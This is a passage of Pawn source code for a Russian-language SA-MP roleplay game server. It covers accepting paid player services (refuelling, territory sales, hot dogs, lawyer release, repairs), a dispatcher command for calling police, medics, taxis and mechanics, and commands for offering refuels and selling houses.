				format(string,250,"Вы собираетесь продать дом %s\n\n\tНомер дома: [%i]\n\tКласс дома: [%s]\n\tДоплата: [%i вирт]",PlayerInfo[playerid][pName],PlayerInfo[i][pPHouseKey],str,GetPVarInt(i,"changehouse_price"));
				ShowPlayerDialogEx(i,0, 0,"Продажа дома",string,"Закрыть","");
				format(string,250,"Вы собираетесь купить дом у %s\n\n\tНомер дома: [%i]\n\tКласс дома: [%s]\n\tВаша доплата: [%i вирт]\n\nКупить дом?",PlayerInfo[i][pName],PlayerInfo[playerid][pPHouseKey],str_,GetPVarInt(i,"changehouse_price"));
				ShowPlayerDialogEx(playerid,1565, 0,"Продажа дома",string,"Купить","Отмена");
			}
			return true;
		}
	}
	else if(strcmp(x_job, "refill",true) == 0)
	{
		if(RefillOffer[playerid] < 999)
		{
			if(IsPlayerConnected(RefillOffer[playerid]))
			{
				if(PlayerInfo[playerid][pCash] > RefillPrice[playerid])
				{
					GetPlayerName(RefillOffer[playerid], giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					new car = GetPlayerVehicleID(playerid);
					format(string, 128, " Автомеханик %s заправил ваш автомобиль на 300 литров за %i вирт",giveplayer,RefillPrice[playerid]);
					SCM(playerid, 0x6495EDFF, string);
					format(string, 128, " Вы заправили машину %s за %i вирт.",sendername,RefillPrice[playerid]);
					SCM(RefillOffer[playerid], 0x6495EDFF, string);
					PlayerInfo[playerid][pCash] -= RefillPrice[playerid];
					format(string, 128, "~r~-%i", RefillPrice[playerid]);
					GameTextForPlayer(playerid, string, 5000, 1);
					PlayerInfo[RefillOffer[playerid]][pPayCheck] += RefillPrice[playerid]/2;
					if(!IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetVehicleModel(car) == 481 || GetVehicleModel(car) == 509 || GetVehicleModel(car) == 510) return SCM(playerid,COLOR_YELLOW, " Вы не в автомобиле или этот транспорт нельзя заправить.");
					else
					{
						Fuell[car] = 300;
						OldFuel[playerid] = floatround(Fuell[car]);
						Refueling[playerid] = 0;
					}
					return true;
				}
				else
				{
					SCM(playerid, COLOR_GREY, " Не достаточно денег");
					return true;
				}
			}
			return true;
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вам не предлагали заправиться!");
			return true;
		}
	}
	else if(strcmp(x_job, "zone",true) == 0)
	{
		if(ZoneOffer[playerid] < 999)
		{
			if(IsPlayerConnected( ZoneOffer[playerid]))
			{
				if(PlayerInfo[playerid][pCash] > ZonePrice[playerid])
				{
					for(new i = 0;i<130;i++)
					{
						if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]))
						{
							if(GZInfo[i][gFrakVlad] != sellzone[playerid]) return SCM(playerid, -1, " Вам не предлагали купить эту территорию");
							GZInfo[i][gFrakVlad] = PlayerInfo[playerid][pMember];
							GangZoneStopFlashForAll(GZInfo[i][gZone]);
							GangZoneHideForAll(GZInfo[i][gZone]);
							GangZoneShowForAll(GZInfo[i][gZone],GetGangZoneColor(i));
							UpdateTable(TABLE_GANGZONE,"gang_owner",GZInfo[i][gFrakVlad],"id",GZInfo[i][gID]);
						}
					}
					GetPlayerName(ZoneOffer[playerid], giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string, 128, "Вы купили территорию у %s за %i вирт.",giveplayer, ZonePrice[playerid]);
					SCM(playerid, 0x6495EDFF, string);
					format(string, 128, "Вы продали территорию %s за %i вирт.",sendername,ZonePrice[playerid]);
					SCM(ZoneOffer[playerid], 0x6495EDFF, string);
					PlayerInfo[playerid][pCash] -= ZonePrice[playerid];
					PlayerInfo[ZoneOffer[playerid]][pCash]+= ZonePrice[playerid];
					ZoneOffer[playerid] = 999;
					ZonePrice[playerid] = 0;
					sellzone[playerid] = 0;
				}
				else
				{
					SCM(playerid, COLOR_GREY, " У вас недостаточно денег!");
					return true;
				}
			}
			return true;
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вам ни кто не предлагал территорию!");
			return true;
		}
	}
	else if(strcmp(x_job, "eat",true) == 0)
	{
		if(!GetPVarInt(playerid,"h_id")) return true;
		new i = GetPVarInt(playerid,"h_id")-1;
		if(!IsPlayerConnected(i)) return SCM(playerid,COLOR_GREY,"Игрок не в сети"), DeletePVar(playerid,"h_id");
		if(PlayerInfo[playerid][pCash] < GetPVarInt(i,"h_price")) return SCM(playerid,COLOR_GREY," Недостаточно средств"), DeletePVar(playerid,"h_id");
		PlayerInfo[playerid][pSatiety] = 100;
		SendMes(playerid,0x6495EDFF," Вы купили ХотДог у %s за %i вирт.",PlayerInfo[i][pName],GetPVarInt(i,"h_price"));
		SendMes(playerid,-1," «Сытость» пополнена до %i",PlayerInfo[playerid][pSatiety]);
		ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0,1);
		SetPlayerChatBubble(playerid,"съел(a) ХотДог",COLOR_PURPLE,30.0,10000);
		SendMes(i,0x6495EDFF," Вы продали ХотДог %s за %i вирт.",PlayerInfo[playerid][pName],GetPVarInt(i,"h_price"));
		PlayerInfo[playerid][pCash] -= GetPVarInt(i,"h_price");
		PlayerInfo[i][pPayCheck] += GetPVarInt(i,"h_price")/2;
		BizzInfo[GetPVarInt(i,"h_contract")][bTill] += GetPVarInt(i,"h_price")/2;
		BizzPay[GetPVarInt(i,"h_contract")] += GetPVarInt(i,"h_price");
		format(string, 16, "~g~+$%i",GetPVarInt(i,"h_price")/2);
		GameTextForPlayer(i, string, 5000, 1);
		format(string, 16, "~r~-$%i",GetPVarInt(i,"h_price"));
		GameTextForPlayer(playerid, string, 5000, 1);
		mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i', pCash = '%i' WHERE name = '%e'", PlayerInfo[playerid][pSatiety], PlayerInfo[playerid][pCash], PlayerInfo[playerid][pName]);
        mysql_function_query(DATABASE,QUERY,false,"","");
		return DeletePVar(playerid,"h_id");
	}
	else if(strcmp(x_job, "free",true) == 0)
	{
		if(FreeOffer[playerid] < 999)
		{
			if(IsPlayerConnected( FreeOffer[playerid]))
			{
				if(SposobOffer[playerid] == 0)
				{
					if(PlayerInfo[playerid][pCash] > FreePrice[playerid])
					{
						GetPlayerName(FreeOffer[playerid], giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, " Вы заплотили адвокату %s %i вирт.",giveplayer, FreePrice[playerid]);
						SCM(playerid, 0x6495EDFF, string);
						format(string, 128, " Вы выпустили %s из тюрьмы за %i вирт.",sendername,FreePrice[playerid]);
						SCM(FreeOffer[playerid], 0x6495EDFF, string);
						PlayerInfo[playerid][pCash] -= FreePrice[playerid];
						PlayerInfo[FreeOffer[playerid]][pCash]+= FreePrice[playerid];
						FreeOffer[playerid] = 999;
						FreePrice[playerid] = 0;
						SposobOffer[playerid] = 0;
						SetPlayerInterior(playerid, 0);
						SetPlayerPos(playerid,1553.4962,-1675.2714,16.1953);
						SetPlayerFacingAngle(playerid, 95.0636);
						PlayerInfo[playerid][pJailTime] = 0;
						PlayerInfo[playerid][pMestoJail] = 0;
						PlayerInfo[playerid][pWantedLevel] = 0;
						SCM(playerid, COLOR_YELLOW, " Вы свободны");
						SCM(playerid, COLOR_GREEN, " Вы заплатили свой долг обществу");
						PlayerCuffed[playerid] = 0;
						SetPlayerWantedLevel(playerid, 0);
						SetPlayerVirtualWorld(playerid, 0);
						format(string, sizeof(string), " [Mayor] Адвокат %s выпустил %s из тюрьмы", giveplayer, Name(playerid));
						SendTeamMessage(PlayerInfo[GetPlayerID(giveplayer)][pMember], COLOR_ALLDEPT, string);
						return true;
					}
					else
					{
						SCM(playerid, COLOR_GREY, " У вас недостаточно денег!");
						return true;
					}
				}
				if(SposobOffer[playerid] == 1)
				{
					if(PlayerInfo[playerid][pBank] > FreePrice[playerid])
					{
						GetPlayerName(FreeOffer[playerid], giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, " Вы заплотили адвокату %s %i вирт.",giveplayer, FreePrice[playerid]);
						SCM(playerid, 0x6495EDFF, string);
						format(string, 128, " Вы выпустили %s из тюрьмы за %i вирт.",sendername,FreePrice[playerid]);
						SCM(FreeOffer[playerid], 0x6495EDFF, string);
						PlayerInfo[playerid][pBank] -= FreePrice[playerid];
						PlayerInfo[FreeOffer[playerid]][pCash]+= FreePrice[playerid];
						FreeOffer[playerid] = 999;
						FreePrice[playerid] = 0;
						SposobOffer[playerid] = 0;
						SetPlayerInterior(playerid, 0);
						SetPlayerPos(playerid,1553.4962,-1675.2714,16.1953);
						SetPlayerFacingAngle(playerid, 95.0636);
						PlayerInfo[playerid][pJailTime] = 0;
						PlayerInfo[playerid][pMestoJail] = 0;
						PlayerInfo[playerid][pWantedLevel] = 0;
						SCM(playerid, COLOR_YELLOW, " Вы свободны");
						SCM(playerid, COLOR_GREEN, " Вы заплатили свой долг обществу");
						PlayerCuffed[playerid] = 0;
						SetPlayerWantedLevel(playerid, 0);
						SetPlayerVirtualWorld(playerid, 0);
						format(string, sizeof(string), " [Mayor] Адвокат %s выпустил %s из тюрьмы", giveplayer, Name(playerid));
						SendTeamMessage(PlayerInfo[GetPlayerID(giveplayer)][pMember], COLOR_ALLDEPT, string);
						return true;
					}
					else
					{
						SCM(playerid, COLOR_GREY, " У вас недостаточно денег!");
						return true;
					}
				}
			}
			return true;
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вам ни кто не предлагал услуши адвоката!");
			return true;
		}
	}
	else if(strcmp(x_job, "repair",true) == 0)
	{
		if(RepairOffer[playerid] < 999)
		{
			if(PlayerInfo[playerid][pCash] > RepairPrice[playerid])
			{
				if(IsPlayerInAnyVehicle(playerid))
				{
					if(IsPlayerConnected(RepairOffer[playerid]))
					{
						GetPlayerName(RepairOffer[playerid], giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						RepairCar[playerid] = GetPlayerVehicleID(playerid);
						SetVehicleHealth(RepairCar[playerid], 1000.0);
						AnRepairVehicle(GetPlayerVehicleID(playerid));
						format(string, 128, " Вашу машину отремонтировал(а) за %i вирт, Механик %s", RepairPrice[playerid], giveplayer);
						SCM(playerid, 0x6495EDFF, string);
						format(string, 128, " Вы починили атомобиль %s за %i вирт",sendername,RepairPrice[playerid]);
						SCM(RepairOffer[playerid], 0x6495EDFF, string);
						format(string, 128, " Деньги поступят к вам на банковский счет во время зарплаты");
						SCM(RepairOffer[playerid], 0x6495EDFF, string);
						PlayerInfo[playerid][pCash] -= RepairPrice[playerid];
						PlayerInfo[RepairOffer[playerid]][pPayCheck] += RepairPrice[playerid];
						RepairOffer[playerid] = 999;
						RepairPrice[playerid] = 0;
						return true;
					}
					return true;
				}
				return true;
			}
			else
			{
				SCM(playerid, COLOR_GREY, " У вас не хватает денег!");
				return true;
			}
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вам не предлагали чинить машину!");
			return true;
		}
	}
	else
	{
		return true;
	}
	return true;
}
CMD:service(playerid, params[])
{
	new action[32], key[32], plid;
	if(sscanf(params, "s[32]", action))
	{
        if((PlayerInfo[playerid][pMember] == 21 || PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pMember] == 1) && GetPVarInt(playerid,"Fraction_Duty"))
		{
			return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/service ac cop");
		}
		else if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pMember] == 22 && GetPVarInt(playerid,"Fraction_Duty"))
        {
			return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/service ac medic");
        }
        else if(PlayerInfo[playerid][pJob] == 4 && GetPVarInt(playerid,"TaxiDuty"))
        {
		 	return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/service ac taxi");
        }
        else if(PlayerInfo[playerid][pJob] == 2)
		{
			return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/service ac mechanic");
		}
		return SCM(playerid, -1, " Введите: /service [call|ac]  [cop|medic|taxi|mechanic]");
	}
	if(sscanf(params, "s[32]s[32]", action, key))
	{
	    if(!strcmp(action, "call", true))
	    {
	        return ShowPlayerDialogEx(playerid, 9956, DIALOG_STYLE_LIST, "Выберите сервис", "[0] Полиция \n[1] Скорая помощь \n[2] Таксопарк\n[3] Автомастерская", "Выбор", "Отмена");
	    }
	    else return SCM(playerid, -1, " Введите: /service [call|ac]  [cop|medic|taxi|mechanic]");
	}
	if(sscanf(params, "s[32]s[32]d", action, key, plid))
	{
	    if(!strcmp(action, "call", true))
	    {
	        if(!strcmp(key, "cop", true))
	        {
	            if(GetPVarInt(playerid, "call_cop") >= 0 && (gettime() - GetPVarInt(playerid, "call_cop")) <= 600) return SCM(playerid, COLOR_GREY, " Диспетчер уже принял ваш вызов!");
	            new online = 0;
				foreach(i)
				{
					if((PlayerInfo[i][pMember] == 21 || PlayerInfo[i][pMember] == 10 || PlayerInfo[i][pMember] == 1) && GetPVarInt(i,"Fraction_Duty")) online++;
				}
				if(online == 0) return SCM(playerid, 0xbc2c2caa, " Диспетчер: ваше сообщение доставлено, но в данный момент на службе никого нет");
				if((PlayerInfo[playerid][pMember] == 21 || PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pMember] == 1) && GetPVarInt(playerid,"Fraction_Duty")) return SCM(playerid, COLOR_GREY, " Ошибка. Вы уже работаете полицейским");
				SCM(playerid, COLOR_RED, " Диспетчер: ваше сообщение доставлено, подождите пока примут вызов");
				SetPVarInt(playerid, "call_cop", gettime());
				foreach(i)
				{
					if((PlayerInfo[i][pMember] == 21 || PlayerInfo[i][pMember] == 10 || PlayerInfo[i][pMember] == 1) && GetPVarInt(i,"Fraction_Duty"))
					{
						format(string, 190, " Диспетчер: вызов от %s[%i]. Примерное расстояние %.2f метр(ов)",PlayerInfo[playerid][pName],playerid, GetDistanceBetweenPlayerss(i,playerid));
						SCM(i, COLOR_RED, string);
						SCM(i, -1, " (( Введите '/service' чтобы принять вызов ))");
					}
				}
	        }
	        else if(!strcmp(key, "medic", true))
	        {
	            if(GetPVarInt(playerid, "call_medic") >= 0 && (gettime() - GetPVarInt(playerid, "call_medic")) <= 600) return SCM(playerid, COLOR_GREY, " Диспетчер уже принял ваш вызов!");
	            new online = 0;
				foreach(i)
				{
					if(PlayerInfo[i][pMember] == 4 && GetPVarInt(i,"Fraction_Duty")) online++;
				}
				if(online == 0) return SCM(playerid, 0xbc2c2caa, " Диспетчер: ваше сообщение доставлено, но в данный момент на службе никого нет");
				if(PlayerInfo[playerid][pMember] == 4 && GetPVarInt(playerid,"Fraction_Duty")) return SCM(playerid, COLOR_GREY, " Ошибка. Вы уже работаете медиком");
				SCM(playerid, COLOR_RED, " Диспетчер: ваше сообщение доставлено, подождите пока примут вызов");
				SetPVarInt(playerid, "call_medic", gettime());
				foreach(i)
				{
					if(PlayerInfo[i][pMember] == 4 || PlayerInfo[i][pMember] == 22 && GetPVarInt(i,"Fraction_Duty"))
					{
						format(string, 190, " Диспетчер: вызов от %s[%i]. Примерное расстояние %.2f метр(ов)",PlayerInfo[playerid][pName], playerid, GetDistanceBetweenPlayerss(i,playerid));
						SCM(i, COLOR_RED, string);
						SCM(i, -1, " (( Введите '/service' чтобы принять вызов ))");
					}
				}
	        }
	        else if(!strcmp(key, "taxi", true))
	        {
	            if(GetPVarInt(playerid, "call_taxi") >= 0 && (gettime() - GetPVarInt(playerid, "call_taxi")) <= 600) return SCM(playerid, COLOR_GREY, " Диспетчер уже принял ваш вызов!");
	            new online = 0;
				foreach(i)
				{
					if(PlayerInfo[i][pJob] == 4 && GetPVarInt(i,"TaxiDuty")) online++;
				}
				if(online == 0) return SCM(playerid, 0xbc2c2caa, " Диспетчер: ваше сообщение доставлено, но в данный момент на службе никого нет");
				if(PlayerInfo[playerid][pJob] == 4 && GetPVarInt(playerid,"TaxiDuty")) return SCM(playerid, COLOR_GREY, " Ошибка. Вы уже работаете таксистом");
				SCM(playerid, COLOR_RED, " Диспетчер: ваше сообщение доставлено, подождите пока примут вызов");
				SetPVarInt(playerid, "call_taxi", gettime());
				foreach(i)
				{
					if(PlayerInfo[i][pJob] == 4 && GetPVarInt(i,"TaxiDuty"))
					{
						format(string, 190, " Диспетчер: вызов от %s[%i]. Примерно расстояние: %.2f метр(ов)",PlayerInfo[playerid][pName],playerid, GetDistanceBetweenPlayerss(i,playerid));
						SCM(i, COLOR_RED, string);
						SCM(i, -1, " (( Введите '/service' чтобы принять вызов ))");
					}
				}
	        }
	        else if(!strcmp(key, "mechanic", true))
	        {
	            if(GetPVarInt(playerid, "call_mechanic") >= 0 && (gettime() - GetPVarInt(playerid, "call_mechanic")) <= 600) return SCM(playerid, COLOR_GREY, " Диспетчер уже принял ваш вызов!");
	            new online = 0;
				foreach(i)
				{
					if(PlayerInfo[i][pJob] == 2) online++;
				}
				if(online == 0) return SCM(playerid, 0xbc2c2caa, " Диспетчер: ваше сообщение доставлено, но в данный момент на службе никого нет");
				//if(PlayerInfo[playerid][pJob] == 2) return SCM(playerid, COLOR_GREY, " Ошибка. Вы уже работаете механником");
				SCM(playerid, COLOR_RED, " Диспетчер: ваше сообщение доставлено, подождите пока примут вызов");
                SetPVarInt(playerid, "call_mechanic", gettime());
				foreach(i)
				{
					if(PlayerInfo[i][pJob] == 2)
					{
						format(string, 190, " Диспетчер: вызов от %s[%i]. Примерное расстояние %.2f метр(ов).",PlayerInfo[playerid][pName], playerid, GetDistanceBetweenPlayerss(i,playerid));
						SCM(i, COLOR_RED, string);
						SCM(i, -1, " (( Введите '/service' чтобы принять вызов ))");
					}
				}
			}
		}
		else if(!strcmp(action, "ac", true))
		{
		    if(!strcmp(key, "cop", true))
		    {
		        if((PlayerInfo[playerid][pMember] == 21 || PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pMember] == 1) && GetPVarInt(playerid,"Fraction_Duty"))
				{
				    new strs[32], counter = 0;
				    format(string, sizeof(string), "");
				    foreach(i)
				    {
				        if(GetPVarInt(i, "call_cop") > 0)
				        {
				            if(GetPVarInt(i, "call_cop") > (gettime() + 600))
							{
								DeletePVar(i, "call_cop");
								SCM(i, COLOR_RED, " Диспетчер: Извините, Ваш вызов не был принят. Повторите попытку.");
								continue;
							}
							if(((gettime() - GetPVarInt(i, "call_cop"))/60) == 0) format(strs, sizeof(strs), "[%i] %s[%i]\t%i сек\t%.2fм\n", counter, Name(i), i, (gettime() - GetPVarInt(i, "call_cop")), GetDistanceBetweenPlayerss(playerid, i));
							format(strs, sizeof(strs), "[%i] %s[%i]\t%i мин\t%.2fм\n", counter, Name(i), i, ((gettime() - GetPVarInt(i, "call_cop"))/60), GetDistanceBetweenPlayerss(playerid, i));
							counter++;
							strcat(string, strs);
				        }
				    }
				    if(strlen(string) == 0) return SCM(playerid, COLOR_GREY, " Нет ни одного вызова");
				    ShowPlayerDialog(playerid, 9508, DIALOG_STYLE_LIST, "Вызовы", string, "Принять", "Отмена");
				}
				else return SCM(playerid, COLOR_GREY, " Вы не можете принять вызов");
		    }
		    else if(!strcmp(key, "medic", true))
		    {
                if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pMember] == 22 && GetPVarInt(playerid,"Fraction_Duty"))
                {
                    new strs[32], counter = 0;
				    format(string, sizeof(string), "");
				    foreach(i)
				    {
				        if(GetPVarInt(i, "call_medic") > 0)
				        {
				            if(GetPVarInt(i, "call_medic") > (gettime() + 600))
							{
								DeletePVar(i, "call_medic");
								SCM(i, COLOR_RED, " Диспетчер: Извините, Ваш вызов не был принят. Повторите попытку.");
								continue;
							}
							if(((gettime() - GetPVarInt(i, "call_medic"))/60) == 0) format(strs, sizeof(strs), "[%i] %s[%i]\t%i сек\t%.2fм\n", counter, Name(i), i, (gettime() - GetPVarInt(i, "call_medic")), GetDistanceBetweenPlayerss(playerid, i));
							format(strs, sizeof(strs), "[%i] %s[%i]\t%i мин\t%.2fм\n", counter, Name(i), i, ((gettime() - GetPVarInt(i, "call_medic"))/60), GetDistanceBetweenPlayerss(playerid, i));
							counter++;
							strcat(string, strs);
				        }
				    }
				    if(strlen(string) == 0) return SCM(playerid, COLOR_GREY, " Нет ни одного вызова");
				    ShowPlayerDialog(playerid, 9508, DIALOG_STYLE_LIST, "Вызовы", string, "Принять", "Отмена");
                }
                else return SCM(playerid, COLOR_GREY, " Вы не можете принять вызов");
		    }
			else if(!strcmp(key, "taxi", true))
		    {
                if(PlayerInfo[playerid][pJob] == 4 && GetPVarInt(playerid,"TaxiDuty"))
                {
                    new strs[64], counter = 0;
				    format(string, sizeof(string), "");
				    foreach(i)
				    {
				        if(GetPVarInt(i, "call_taxi") > 0)
				        {
				            if(GetPVarInt(i, "call_taxi") > (gettime() + 600))
							{
								DeletePVar(i, "call_taxi");
								SCM(i, COLOR_RED, " Диспетчер: Извините, Ваш вызов не был принят. Повторите попытку.");
								continue;
							}
							if(((gettime() - GetPVarInt(i, "call_taxi"))/60) == 0) format(strs, sizeof(strs), "[%i] %s[%i]\t%i сек\t%.2fм\n", counter, Name(i), i, (gettime() - GetPVarInt(i, "call_taxi")), GetDistanceBetweenPlayerss(playerid, i));
							else format(strs, sizeof(strs), "[%i] %s[%i]\t%i мин\t%.2fм\n", counter, Name(i), i, ((gettime() - GetPVarInt(i, "call_taxi"))/60), GetDistanceBetweenPlayerss(playerid, i));
							counter++;
							strcat(string, strs);
				        }
				    }
				    if(strlen(string) == 0) return SCM(playerid, COLOR_GREY, " Нет ни одного вызова");
				    ShowPlayerDialog(playerid, 9508, DIALOG_STYLE_LIST, "Вызовы", string, "Принять", "Отмена");
                }
                else return SCM(playerid, COLOR_GREY, " Вы не можете принять вызов");
		    }
			else if(!strcmp(key, "mechanic", true))
		    {
                if(PlayerInfo[playerid][pJob] == 2)
				{
				    new strs[32], counter = 0;
				    format(string, sizeof(string), "");
				    foreach(i)
				    {
				        if(GetPVarInt(i, "call_mechanic") > 0)
				        {
				            if(GetPVarInt(i, "call_mechanic") > (gettime() + 600))
							{
								DeletePVar(i, "call_mechanic");
								SCM(i, COLOR_RED, " Диспетчер: Извините, Ваш вызов не был принят. Повторите попытку.");
								continue;
							}
							if(((gettime() - GetPVarInt(i, "call_mechanic"))/60) == 0) format(strs, sizeof(strs), "[%i] %s[%i]\t%i сек\t%.2fм.\n", counter, Name(i), i, (gettime() - GetPVarInt(i, "call_mechanic")), GetDistanceBetweenPlayerss(playerid, i));
							format(strs, sizeof(strs), "[%i] %s[%i]\t%i мин\t%.2fм.\n", counter, Name(i), i, ((gettime() - GetPVarInt(i, "call_mechanic"))/60), GetDistanceBetweenPlayerss(playerid, i));
							counter++;
							strcat(string, strs);
				        }
				    }
				    if(strlen(string) == 0) return SCM(playerid, COLOR_GREY, " Нет ни одного вызова");
				    ShowPlayerDialog(playerid, 9508, DIALOG_STYLE_LIST, "Вызовы", string, "Принять", "Отмена");
				}
				else return SCM(playerid, COLOR_GREY, " Вы не можете принять вызов");
		    }
		}
	}
	else
	{
	    if(!strcmp(action, "ac", true))
	    {
			new sendername[32], giveplayer[32];
	        if(plid == INVALID_PLAYER_ID || !IsPlayerConnected(plid)) return SCM(playerid, COLOR_GREY, " Игрок оффлайн!");
	        GetPlayerName(playerid, sendername, sizeof(sendername));
			GetPlayerName(plid, giveplayer, sizeof(giveplayer));
			format(string, 128, " Диспетчер: %s[%i] принял вызов %s[%i]",sendername,playerid,giveplayer,plid);
			if((PlayerInfo[playerid][pMember] == 21 || PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pMember] == 1) && GetPVarInt(playerid,"Fraction_Duty"))//cop
			{
				foreach(i)
				{
				    if((PlayerInfo[i][pMember] == 21 || PlayerInfo[i][pMember] == 10 || PlayerInfo[i][pMember] == 1) && GetPVarInt(i,"Fraction_Duty") && IsInCopCar(i))
						SCM(i, COLOR_RED, string);
				}
				format(string, 128, " Патрульный %s принял ваш вызов, пожалуйста ждите на месте.",sendername);
				DeletePVar(plid, "call_cop");
			}
			else if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pMember] == 22 && GetPVarInt(playerid,"Fraction_Duty"))//medic
	        {
				foreach(i)
				{
				    if(PlayerInfo[i][pMember] == 4 || PlayerInfo[i][pMember] == 22 && GetPVarInt(i,"Fraction_Duty"))
						SCM(i, COLOR_RED, string);
				}
				format(string, 128, " Медик %s принял ваш вызов, пожалуйста ждите на месте.",sendername);
				DeletePVar(plid, "call_medic");
	        }
	        else if(PlayerInfo[playerid][pJob] == 4 && GetPVarInt(playerid,"TaxiDuty"))//taxi
	        {
			 	foreach(i)
				{
				    if(PlayerInfo[i][pJob] == 4 && GetPVarInt(i,"TaxiDuty"))
						SCM(i, COLOR_RED, string);
				}
				format(string, 128, " Таксист %s принял ваш вызов, пожалуйста ждите на месте.",sendername);
				DeletePVar(plid, "call_taxi");
	        }
	        else if(PlayerInfo[playerid][pJob] == 2)//mechanic
			{
				foreach(i)
				{
				    if(PlayerInfo[i][pJob] == 2)
						SCM(i, COLOR_RED, string);
				}
				format(string, 128, " Механик %s принял ваш вызов, пожалуйста ждите на месте.",sendername);
				DeletePVar(plid, "call_mechanic");
			}
			if(isService(playerid))
			{
				SCM(plid, 0x6495EDFF, string);
				new Float:X, Float:Y, Float:Z;
				GetPlayerPos(plid, X, Y, Z);
				SetPlayerCheckpoint(playerid, X, Y, Z, 5);
				updatecheck[playerid] = plid;
				SetTimerEx("kekovich" , 1000, true, "i", playerid);
				CP[playerid] = 777;
			}
	    }
	}
	return true;
}
stock isService(playerid)
{
	if((PlayerInfo[playerid][pJob] == 2) || (PlayerInfo[playerid][pJob] == 4 && GetPVarInt(playerid,"TaxiDuty"))
	|| (PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pMember] == 22 && GetPVarInt(playerid,"Fraction_Duty"))
	|| ((PlayerInfo[playerid][pMember] == 21 || PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pMember] == 1)
	&& GetPVarInt(playerid,"Fraction_Duty")))
		return true;
	return false;
}
CMD:refill(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 2) return SCM(playerid, COLOR_GREY, " Вы не Механик!");
	if(gcontract[playerid] != 1) return SCM(playerid, COLOR_GREY, " У вас не подписан контракт с заправкой!");
	if(sscanf(params, "ud", params[0])) return SCM(playerid, -1, " Введите: /refill [playerid]");
	if(!IsPlayerConnected(params[0])) return true;
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 525) return SCM(playerid, COLOR_GREY, " Вы не в машине механика");
	if(!ProxDetectorS(8.0, playerid, params[0]) || !IsPlayerInAnyVehicle(params[0])) return true;
	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " [Ошибка] Вы указали свой ID");
	format(YCMDstr, sizeof(YCMDstr), " Вы предложили %s заправить его машину за %i вирт.",Name(params[0]),cenabenza[playerid]);
	SCM(playerid, 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Механик %s хочет заправить ваш автомобиль за %i вирт, (( /accept refill ))",Name(playerid),cenabenza[playerid]);
	SCM(params[0], 0x6495EDFF, YCMDstr);
	SetPVarInt(playerid,"RefillOffer",params[0]);
	RefillOffer[params[0]] = playerid;
	RefillPrice[params[0]] = cenabenza[playerid];
	return true;
}
CMD:changehouse(playerid, params[])
{
	if(!HGet(playerid)) return SCM(playerid, COLOR_GREY, " У вас нет дома!");
	new bouse = PlayerInfo[playerid][pPHouseKey];
	if(sscanf(params, "ud", params[0],params[1])) return SCM(playerid, -1, " Введите: /changehouse [playerid] [цена]");
	if(params[1] < 1 || params[0] > 100000000) return SCM(playerid, COLOR_GREY, " Не менее 1 и не более 100000000 вирт!");
	if(!ProxDetectorS(8.0, playerid, params[0])) return SCM(playerid, COLOR_GREY," Игрок должен находиться рядом с вами!");
	if(GetPVarInt(playerid,"changehouse")) return SCM(playerid,COLOR_GREY," Вы уже предложили кому то купить ваш дом!");
	if(GetPVarInt(params[0],"_changehouse")) return SCM(playerid,COLOR_GREY," Этому игроку уже предложили купить дом!");
	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете продать дом самому себе!");
	if((!PlayerToPoint(10, playerid,HouseInfo[bouse][hExitx], HouseInfo[bouse][hExity], HouseInfo[bouse][hExitz]) || GetPlayerVirtualWorld(playerid) != bouse+50) && !PlayerToPoint(2.0, playerid, HouseInfo[bouse][hEntrancex], HouseInfo[bouse][hEntrancey], HouseInfo[bouse][hEntrancez])) return SCM(playerid,COLOR_GREY," Вы должны находиться возле, или внутри вашего дома");
	if(HGet(params[0]))
	{
		SendMes(playerid,0x6495EDFF," Вы предложили %s обменяться домами. Доплата: [%i вирт]",PlayerInfo[params[0]][pName], params[1]);
		SendMes(params[0],0x6495EDFF," %s предлагает вам обменяться домами. Ваша доплата: [%i вирт]",PlayerInfo[playerid][pName], params[1]);
	}
	else
	{
		SendMes(playerid,0x6495EDFF," Вы предложили %s купить ваш дом. Стоимость: [%i вирт]",PlayerInfo[params[0]][pName], params[1]);
		SendMes(params[0],0x6495EDFF," %s предлагает вам купить его дом. Стоимость: [%i вирт]",PlayerInfo[playerid][pName], params[1]);
	}
	SCM(params[0],0x6495EDFF," (( Введите /(ac)cept house для подтверждения сделки! ))");
	format(YCMDstr, sizeof(YCMDstr), " %s предложил(а) обменяться домами %s.",Name(playerid) ,Name(params[0]));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	SetPVarInt(playerid,"changehouse",params[0]+1);
